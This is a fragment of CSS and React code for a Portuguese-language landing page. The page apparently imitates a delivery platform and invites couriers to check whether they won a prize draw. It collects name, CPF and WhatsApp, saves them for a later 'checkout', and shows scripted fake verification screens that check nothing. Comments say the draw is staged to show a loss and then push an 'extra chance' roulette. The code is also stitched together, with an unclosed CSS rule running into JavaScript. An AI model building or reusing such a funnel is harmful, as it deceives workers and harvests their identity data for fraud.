        .animate-bounce-in {

        }
        
        .animate-fade-in {
            animation: fadeIn 0.4s ease-in-out forwards;
        }
        
        .animate-slide-up {
            animation: slideUp 0.4s cubic-bezier(0.16, 1, 0.3, 1) forwards;
        }

        @keyframes bounceIn {
            0% { transform: scale(0.9); opacity: 0; }
            100% { transform: scale(1); opacity: 1; }
        }
        
        @keyframes fadeIn {
            0% { opacity: 0; }
            100% { opacity: 1; }
        }
        
        @keyframes slideUp {
            0% { transform: translateY(100%); opacity: 0; }
            100% { transform: translateY(0); opacity: 1; }
        }

        .confetti {
            position: fixed;
            width: 10px;
            height: 10px;
            background-color: #f00;
            animation: confetti-fall 3s linear infinite;
            z-index: 9999;
        }

        @keyframes confetti-fall {
            0% { transform: translateY(-10vh) rotate(0deg); opacity: 1; }
            100% { transform: translateY(110vh) rotate(720deg); opacity: 0; }
        }

        .hide-scrollbar::-webkit-scrollbar {
            display: none;
        }
        .hide-scrollbar {
            -ms-overflow-style: none;
            scrollbar-width: none;
        }
        
        .spinner {
            border: 3px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top: 3px solid #ffffff;
            width: 20px;
            height: 20px;
            -webkit-animation: spin 1s linear infinite;
            animation: spin 1s linear infinite;
        }
        
        .spinner-red {
            border: 3px solid rgba(234, 29, 44, 0.2);
            border-top: 3px solid #EA1D2C;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .shipping-card {
            border: 2px solid #e5e7eb;
            transition: all 0.3s ease;
            cursor: pointer;
        }
        .shipping-card.active {
            border-color: #EA1D2C;
            background-color: #fff1f2;

        // --- VALIDADOR MATEMÁTICO DE CPF ---
        const validarCPF = (cpf) => {
            cpf = cpf.replace(/[^\d]+/g, '');
            if (cpf == '' || cpf.length !== 11 || /^(\d)\1{10}$/.test(cpf)) return false;
            let soma = 0;
            for (let i = 1; i <= 9; i++) soma += parseInt(cpf.substring(i - 1, i)) * (11 - i);
            let resto = (soma * 10) % 11;
            if ((resto === 10) || (resto === 11)) resto = 0;
            if (resto !== parseInt(cpf.substring(9, 10))) return false;
            soma = 0;
            for (let i = 1; i <= 10; i++) soma += parseInt(cpf.substring(i - 1, i)) * (12 - i);
            resto = (soma * 10) % 11;
            if ((resto === 10) || (resto === 11)) resto = 0;
            if (resto !== parseInt(cpf.substring(10, 11))) return false;
            return true;
        };

            const [bloco, setBloco] = React.useState(0); 
            const [valStep, setValStep] = React.useState(1);
            const [dados, setDados] = React.useState({ nome: '', cpf: '', whatsapp: '', modelo: '', termo: false });
            const [cpfError, setCpfError] = React.useState(false);
            const [loadingCheck, setLoadingCheck] = React.useState(0);
            const [successCheck, setSuccessCheck] = React.useState(0); 
            const [loadingSorteio, setLoadingSorteio] = React.useState(true); 
            const [showChance, setShowChance] = React.useState(false);

            // Máscara e Validação
            const handleCpfChange = (e) => {
                let val = e.target.value.replace(/\D/g, '');
                if (val.length <= 11) {
                    val = val.replace(/(\d{3})(\d)/, '$1.$2');
                    val = val.replace(/(\d{3})(\d)/, '$1.$2');
                    val = val.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
                    setDados({...dados, cpf: val});
                    setCpfError(false);
                }
            };

            const handlePhoneChange = (e) => {
                let val = e.target.value.replace(/\D/g, '');
                if (val.length <= 11) {
                    val = val.replace(/(\d{2})(\d)/, '($1) $2');
                    val = val.replace(/(\d{5})(\d)/, '$1-$2');
                    setDados({...dados, whatsapp: val});
                }
            };

            // Modal Form -> Bloco 2 (E Guarda os dados para auto-preencher depois)
            const submitConsulta = (e) => {
                e.preventDefault();
                playSound('click');
                if (!validarCPF(dados.cpf)) {
                    setCpfError(true);
                    return;
                }
                // Guarda nome, cpf e whatsapp para auto-preenchimento no Checkout
                safeSetLocal('entregador_user_name', dados.nome); 
                safeSetLocal('entregador_user_cpf', dados.cpf);
                safeSetLocal('entregador_user_phone', dados.whatsapp);
                
                setBloco(2);
                window.scrollTo(0,0);
            };

            // Bloco 2 (Loading) -> Bloco 3
            React.useEffect(() => {
                if (bloco === 2) {
                    const timers = [
                        setTimeout(() => setLoadingCheck(1), 1200),
                        setTimeout(() => setLoadingCheck(2), 2400),
                        setTimeout(() => setLoadingCheck(3), 3600),
                        setTimeout(() => setBloco(3), 5000)
                    ];
                    return () => timers.forEach(clearTimeout);
                }
            }, [bloco]);

            // Bloco 5 -> Animação progressiva dos checks verdes
            React.useEffect(() => {
                if (bloco === 5) {
                    const timers = [
                        setTimeout(() => setSuccessCheck(1), 600),
                        setTimeout(() => setSuccessCheck(2), 1400),
                        setTimeout(() => setSuccessCheck(3), 2200)
                    ];
                    return () => timers.forEach(clearTimeout);
                }
            }, [bloco]);

            // Bloco 6 -> Lógica de suspense do Sorteio e revelação da chance extra (ACELERADO)
            React.useEffect(() => {
                if (bloco === 6) {
                    setLoadingSorteio(true);
                    setShowChance(false);
                    // Fica girando "Apurando resultado" por apenas 2.5 segundos
                    const t1 = setTimeout(() => setLoadingSorteio(false), 2500); 
                    // Depois que mostra que perdeu, espera mais 1.5 segundos pra oferecer a roleta (Total 4s)
                    const t2 = setTimeout(() => setShowChance(true), 4000); 
                    
                    return () => { clearTimeout(t1); clearTimeout(t2); };
                }
            }, [bloco]);

            const getButtonClass = (isActive) => {
                return `w-full mb-3 font-bold py-4 rounded-xl transition-all border-2 text-left px-6 bg-white border-gray-200 text-gray-800 hover:border-[#EA1D2C] active:bg-gray-50`;
            };

            const handleAnswer = () => {
                playSound('click');
                if (valStep < 5) {
                    setTimeout(() => setValStep(valStep + 1), 300);
                } else {
                    // Após a última pergunta da validação, vai para Bloco 5 (Verificação Concluída)
                    setTimeout(() => {
                        setBloco(5);
                        window.scrollTo(0,0);
                    }, 400);
                }
            };

            return (
                <div className="flex flex-col flex-1 font-sans">
                    
                    {/* BLOCOS 0 E 1: LANDING PAGE */}
                    {(bloco === 0 || bloco === 1) && (
                        <div className={`flex-1 w-full relative flex flex-col items-center justify-between pb-8 pt-4 overflow-hidden transition-all duration-300 ${bloco === 1 ? 'blur-[2px] brightness-50' : ''}`} 
                             style={{ 
                                 backgroundColor: '#EA1D2C',
                                 backgroundImage: 'url(https://i.imgur.com/fSeAPYQ.jpeg)',
                                 backgroundSize: 'cover',
                                 backgroundPosition: 'top center',
                                 backgroundRepeat: 'no-repeat'
                             }}>
                            
                            {/* Efeitos de Fundo com Imagem */}
                            <div className="absolute top-0 left-1/2 transform -translate-x-1/2 w-[180%] h-[60%] bg-[radial-gradient(ellipse_at_top,_var(--tw-gradient-stops))] from-yellow-500/40 via-transparent to-transparent opacity-80 pointer-events-none z-0"></div>

                            {/* TOPO: Moldura invisível muito maior para empurrar o botão lá para baixo */}
                            <div className="relative z-10 flex flex-col items-center w-full px-6 text-center mt-2 min-h-[380px] grow">
                                {/* Espaço vazio aumentado (380px + grow) para descer o conteúdo inferior */}
                            </div>

                            {/* BASE: Botão (Movido para o fundo extremo) */}
                            <div className="relative z-10 w-full px-6 mt-auto max-w-sm mx-auto flex flex-col items-center mb-2">
                                
                                <button onClick={() => { playSound('click'); setBloco(1); }} className="w-full bg-yellow-400 hover:bg-yellow-500 text-red-900 font-black py-[20px] rounded-[20px] shadow-[0_10px_35px_rgba(250,204,21,0.4)] text-[17px] flex justify-center items-center gap-2 transition-transform active:scale-95 uppercase tracking-wide border-b-[5px] border-yellow-600">
                                    CONSULTAR AGORA <span className="text-xl ml-1 leading-none">→</span>
                                </button>
                                
                                <div className="text-center text-white/80 text-[9px] mt-4 font-bold uppercase tracking-widest space-y-1 drop-shadow-md">
                                    <p>*Confira a elegibilidade do perfil</p>
                                    <p>*Equipamentos sujeitos a estoque</p>
                                </div>
                            </div>
                        </div>
                    )}

                    {/* BLOCO 1 (OVERLAY MODAL) */}
                    {bloco === 1 && (
                        <div className="fixed inset-0 z-50 flex items-end sm:items-center justify-center bg-black/60 animate-fade-in p-0 sm:p-4">
                            <div className="bg-white w-full max-w-md rounded-t-[32px] sm:rounded-[32px] p-7 pb-10 shadow-[0_-10px_40px_rgba(0,0,0,0.3)] relative animate-slide-up sm:animate-bounce-in max-h-[90vh] overflow-y-auto hide-scrollbar">
                                <button type="button" onClick={() => setBloco(0)} className="absolute top-5 right-5 text-gray-400 hover:text-gray-800 bg-gray-100 hover:bg-gray-200 rounded-full p-2 transition-colors">
                                    <svg className="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={3}><path strokeLinecap="round" strokeLinejoin="round" d="M6 18L18 6M6 6l12 12" /></svg>
                                </button>

                                <h2 className="text-[22px] font-black text-gray-900 mb-6 pr-10 leading-tight tracking-tight">Confira se você foi sorteado</h2>

                                <form onSubmit={submitConsulta} className="space-y-4">
                                    <div>
                                        <input required type="text" className="w-full bg-gray-50 border border-gray-200 rounded-[14px] p-4 text-[15px] focus:outline-none focus:border-[#EA1D2C] focus:ring-2 focus:ring-red-100 font-medium transition-all placeholder:text-gray-400" placeholder="Nome Completo (Ex: João Rodrigues)" value={dados.nome} onChange={e => setDados({...dados, nome: e.target.value})} />
                                    </div>
                                    
                                    <div>
                                        <input required type="tel" className={`w-full bg-gray-50 border ${cpfError ? 'border-red-500 bg-red-50' : 'border-gray-200'} rounded-[14px] p-4 text-[15px] focus:outline-none focus:border-[#EA1D2C] focus:ring-2 focus:ring-red-100 font-medium transition-all placeholder:text-gray-400`} placeholder="CPF" value={dados.cpf} onChange={handleCpfChange} />
                                        {cpfError && <p className="text-red-500 text-[11px] font-bold mt-2 ml-2 animate-fade-in">⚠️ Preencha um CPF válido</p>}
                                    </div>
                                    
                                    <div>
                                        <input required type="tel" className="w-full bg-gray-50 border border-gray-200 rounded-[14px] p-4 text-[15px] focus:outline-none focus:border-[#EA1D2C] focus:ring-2 focus:ring-red-100 font-medium transition-all placeholder:text-gray-400" placeholder="WhatsApp" value={dados.whatsapp} onChange={handlePhoneChange} />
                                    </div>
                                    
                                    <div className="pt-3 pb-2">
                                        <label className="text-[13px] font-bold text-gray-600 block mb-3">Como você faz suas entregas?</label>
                                        <div className="flex gap-2 flex-wrap">
                                            {['Bike', 'Moto', 'Carro'].map(m => (
                                                <div key={m} onClick={() => { playSound('click'); setDados({...dados, modelo: m}); }} className={`py-3 px-1 rounded-xl border-[1.5px] cursor-pointer transition-all flex-1 text-center min-w-[70px] ${dados.modelo === m ? 'bg-red-50 border-[#EA1D2C] text-[#EA1D2C] font-black shadow-sm' : 'bg-white border-gray-200 text-gray-600 font-medium hover:border-gray-300'}`}>
                                                    <span className="text-[13px] tracking-wide">{m}</span>
                                                </div>
                                            ))}
                                        </div>
                                    </div>

                                    <label className="flex items-start gap-3 mt-4 mb-2 cursor-pointer p-2 rounded-lg hover:bg-gray-50 transition-colors">
                                        <input type="checkbox" required checked={dados.termo} onChange={e => setDados({...dados, termo: e.target.checked})} className="mt-0.5 w-5 h-5 rounded border-gray-300" />
                                        <span className="text-[11px] text-gray-500 leading-snug font-medium">Concordo em fornecer meus dados para receber conteúdos e ofertas por e-mail ou outros meios</span>
                                    </label>
                                    
                                    <button type="submit" disabled={!dados.modelo || !dados.termo} className={`w-full text-white font-black py-4 rounded-[16px] shadow-lg mt-4 text-[15px] uppercase tracking-wide transition-all ${dados.modelo && dados.termo ? 'bg-[#EA1D2C] active:scale-95 hover:bg-red-700' : 'bg-gray-300 text-gray-500 shadow-none cursor-not-allowed'}`}>
                                        Continuar <span className="ml-1">→</span>
                                    </button>
                                </form>
                            </div>
                        </div>
                    )}

                    {/* BLOCOS 2 A 6 (FLUXO INTERNO PÓS-MODAL) */}
                    {bloco >= 2 && (
                        <div className="flex-1 bg-white flex flex-col pt-10 px-6 pb-20 items-center">
                            <div className="max-w-md w-full">
                                
                                {/* BLOCO 2 - LOADING INICIAL DA VALIDAÇÃO */}
                                {bloco === 2 && (
                                    <div className="flex flex-col items-center justify-center py-10 animate-fade-in text-center">
                                        <div className="w-16 h-16 border-4 border-gray-100 border-t-[#EA1D2C] rounded-full animate-spin mb-8"></div>
                                        <h2 className="text-xl font-black text-gray-900 uppercase tracking-tight mb-10">Verificando informações...</h2>
                                        
                                        <div className="space-y-5 w-full max-w-[260px] text-left ml-4">
                                            <div className="flex items-center gap-4 transition-opacity duration-500" style={{opacity: loadingCheck >= 1 ? 1 : 0.2}}>
                                                <div className={`w-7 h-7 rounded-full flex items-center justify-center shadow-sm ${loadingCheck >= 1 ? 'bg-gray-800' : 'bg-gray-200'}`}>
                                                    <svg className="w-4 h-4 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={3}><path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" /></svg>
                                                </div>
                                                <span className="text-[15px] font-bold text-gray-700 tracking-tight">Analisando dados...</span>
                                            </div>
                                            <div className="flex items-center gap-4 transition-opacity duration-500" style={{opacity: loadingCheck >= 2 ? 1 : 0.2}}>
                                                <div className={`w-7 h-7 rounded-full flex items-center justify-center shadow-sm ${loadingCheck >= 2 ? 'bg-gray-800' : 'bg-gray-200'}`}>
                                                    <svg className="w-4 h-4 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={3}><path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" /></svg>
                                                </div>
                                                <span className="text-[15px] font-bold text-gray-700 tracking-tight">Conectando ao sistema</span>
                                            </div>
                                            <div className="flex items-center gap-4 transition-opacity duration-500" style={{opacity: loadingCheck >= 3 ? 1 : 0.2}}>
                                                <div className={`w-7 h-7 rounded-full flex items-center justify-center shadow-sm ${loadingCheck >= 3 ? 'bg-[#EA1D2C]' : 'bg-gray-200'}`}>
                                                    <svg className="w-4 h-4 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={3}><path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" /></svg>
                                                </div>
                                                <span className="text-[15px] font-bold text-gray-700 tracking-tight">Preparando validação</span>
                                            </div>
                                        </div>
                                    </div>
                                )}

                                {/* BLOCO 3 - SAUDAÇÃO COM NOME ANTES DA VALIDAÇÃO */}
                                {bloco === 3 && (
                                    <div className="animate-bounce-in text-center py-6">
                                        <div className="w-20 h-20 bg-gray-100 rounded-full flex items-center justify-center mx-auto mb-6 border-2 border-[#EA1D2C] overflow-hidden shadow-md">
                                            <img src="https://i.imgur.com/tHulsoM.png" alt="Perfil do Entregador" className="w-full h-full object-cover" />
                                        </div>
                                        <h1 className="text-3xl font-black text-gray-900 mb-4 leading-tight tracking-tighter">Olá, {dados.nome.trim().split(' ')[0] || 'Entregador'}.</h1>
                                        <p className="text-[15px] text-gray-600 font-medium leading-relaxed mb-10">
                                            Identificamos seu cadastro.<br/><br/>
                                            Agora vamos confirmar se você<br/>está ativo na plataforma de entregas.
                                        </p>
                                        <button onClick={() => { playSound('click'); setBloco(4); }} className="w-full bg-[#EA1D2C] hover:bg-red-700 text-white font-black py-4 rounded-xl shadow-[0_8px_20px_rgba(234,29,44,0.3)] uppercase tracking-wide active:scale-95 transition-transform text-[15px]">
                                            INICIAR VALIDAÇÃO
                                        </button>
                                    </div>
                                )}

                                {/* BLOCO 4 - PERGUNTAS DE VALIDAÇÃO */}
                                {bloco === 4 && (
                                    <div className="animate-fade-in">
                                        <div className="mb-10 flex items-center gap-3">
                                            <div className="w-10 h-10 bg-gray-100 rounded-xl flex items-center justify-center border border-gray-200">
                                                <svg className="w-5 h-5 text-gray-600" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}><path strokeLinecap="round" strokeLinejoin="round" d="M9 5H7a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2V7a2 2 0 00-2-2h-2M9 5a2 2 0 002 2h2a2 2 0 002-2M9 5a2 2 0 012-2h2a2 2 0 012 2m-6 9l2 2 4-4" /></svg>
                                            </div>
                                            <div>
                                                <span className="font-black text-gray-900 block leading-none text-sm">Validação do Entregador(a)</span>
                                                <span className="text-[#EA1D2C] text-[10px] font-bold uppercase tracking-widest">Pergunta {valStep} de 5</span>
                                            </div>
                                        </div>

                                        {valStep === 1 && (
                                            <div className="animate-fade-in">
                                                <p className="font-black text-gray-800 text-xl mb-6">Você realizou entregas nos últimos 7 dias?</p>
                                                <button onClick={handleAnswer} className={getButtonClass()}>Sim, todos os dias</button>
                                                <button onClick={handleAnswer} className={getButtonClass()}>Sim, em alguns dias</button>
                                                <button onClick={handleAnswer} className={getButtonClass()}>Não</button>
                                            </div>
                                        )}

                                        {valStep === 2 && (
                                            <div className="animate-fade-in">
                                                <p className="font-black text-gray-800 text-xl mb-6">Qual meio você utiliza para trabalhar?</p>
                                                <button onClick={handleAnswer} className={getButtonClass()}>Moto</button>
                                                <button onClick={handleAnswer} className={getButtonClass()}>Bike</button>
                                                <button onClick={handleAnswer} className={getButtonClass()}>Carro</button>
                                            </div>
                                        )}

                                        {valStep === 3 && (
                                            <div className="animate-fade-in">
                                                <p className="font-black text-gray-800 text-xl mb-6">Há quanto tempo você trabalha com entregas?</p>
                                                <button onClick={handleAnswer} className={getButtonClass()}>Menos de 6 meses</button>
                                                <button onClick={handleAnswer} className={getButtonClass()}>Entre 6 meses e 1 ano</button>
                                                <button onClick={handleAnswer} className={getButtonClass()}>Mais de 1 ano</button>
                                            </div>
                                        )}

                                        {valStep === 4 && (
                                            <div className="animate-fade-in">
                                                <p className="font-black text-gray-800 text-xl mb-6">Quantas corridas você conclui em média por dia?</p>
                                                <button onClick={handleAnswer} className={getButtonClass()}>Até 5 corridas</button>
                                                <button onClick={handleAnswer} className={getButtonClass()}>De 6 a 15 corridas</button>
                                                <button onClick={handleAnswer} className={getButtonClass()}>Mais de 15 corridas</button>
                                            </div>
                                        )}

                                        {valStep === 5 && (
                                            <div className="animate-fade-in">
                                                <p className="font-black text-gray-800 text-xl mb-6">Qual a sua taxa de aceitação média no aplicativo?</p>
                                                <button onClick={handleAnswer} className={getButtonClass()}>Acima de 80%</button>
                                                <button onClick={handleAnswer} className={getButtonClass()}>Entre 50% e 80%</button>
                                                <button onClick={handleAnswer} className={getButtonClass()}>Abaixo de 50% / Não sei</button>
                                            </div>
                                        )}
                                    </div>
                                )}

                                {/* BLOCO 5 - NOVA TELA DE VERIFICAÇÃO CONCLUÍDA (PERFIL ATIVO) */}
                                {bloco === 5 && (
                                    <div className="animate-bounce-in text-center py-6">
                                        <div className="w-16 h-16 bg-green-50 rounded-full flex items-center justify-center mx-auto mb-6 border-2 border-green-100">
                                            <svg className="w-8 h-8 text-green-500" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={3}><path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" /></svg>
                                        </div>
                                        <h2 className="text-2xl font-black text-gray-900 mb-6 tracking-tight uppercase">VERIFICAÇÃO CONCLUÍDA</h2>
                                        
                                        <div className="space-y-4 w-full max-w-[260px] text-left mx-auto mb-8 bg-gray-50 p-5 rounded-2xl border border-gray-100">
                                            <div className="flex items-center gap-3 transition-opacity duration-500" style={{opacity: successCheck >= 1 ? 1 : 0.3}}>
                                                <div className={`w-6 h-6 rounded-full flex items-center justify-center shadow-sm shrink-0 transition-colors duration-500 ${successCheck >= 1 ? 'bg-green-500' : 'bg-gray-300'}`}>
                                                    <svg className={`w-3 h-3 text-white transition-opacity duration-300 ${successCheck >= 1 ? 'opacity-100 animate-bounce-in' : 'opacity-0'}`} fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={4}><path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" /></svg>
                                                </div>
                                                <span className="text-[13px] font-bold text-gray-700">Perfil localizado</span>
                                            </div>
                                            <div className="flex items-center gap-3 transition-opacity duration-500" style={{opacity: successCheck >= 2 ? 1 : 0.3}}>
                                                <div className={`w-6 h-6 rounded-full flex items-center justify-center shadow-sm shrink-0 transition-colors duration-500 ${successCheck >= 2 ? 'bg-green-500' : 'bg-gray-300'}`}>
                                                    <svg className={`w-3 h-3 text-white transition-opacity duration-300 ${successCheck >= 2 ? 'opacity-100 animate-bounce-in' : 'opacity-0'}`} fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={4}><path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" /></svg>
                                                </div>
                                                <span className="text-[13px] font-bold text-gray-700">Entregador ativo</span>
                                            </div>
                                            <div className="flex items-center gap-3 transition-opacity duration-500" style={{opacity: successCheck >= 3 ? 1 : 0.3}}>
                                                <div className={`w-6 h-6 rounded-full flex items-center justify-center shadow-sm shrink-0 transition-colors duration-500 ${successCheck >= 3 ? 'bg-green-500' : 'bg-gray-300'}`}>
                                                    <svg className={`w-3 h-3 text-white transition-opacity duration-300 ${successCheck >= 3 ? 'opacity-100 animate-bounce-in' : 'opacity-0'}`} fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={4}><path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" /></svg>
                                                </div>
                                                <span className="text-[13px] font-bold text-gray-700">Elegível para consulta</span>
                                            </div>
                                        </div>

                                        <div className={`transition-opacity duration-1000 ${successCheck >= 3 ? 'opacity-100' : 'opacity-0'}`}>
                                            <p className="text-[14px] text-gray-600 font-medium leading-relaxed mb-8 px-2">

                                                Agora você pode consultar o resultado do sorteio desta rodada.

                                            <button onClick={() => { playSound('click'); setBloco(6); window.scrollTo(0,0); }} className="w-full bg-[#EA1D2C] hover:bg-red-700 text-white font-black py-4 rounded-xl shadow-[0_8px_20px_rgba(234,29,44,0.3)] uppercase tracking-wide active:scale-95 transition-transform text-[15px]">
                                                VER RESULTADO DO SORTEIO
                                            </button>
                                        </div>
                                    </div>

                                {/* BLOCO 6 - RESULTADO DO SORTEIO E CHANCE EXTRA (COM EFEITO SUSPENSE) */}
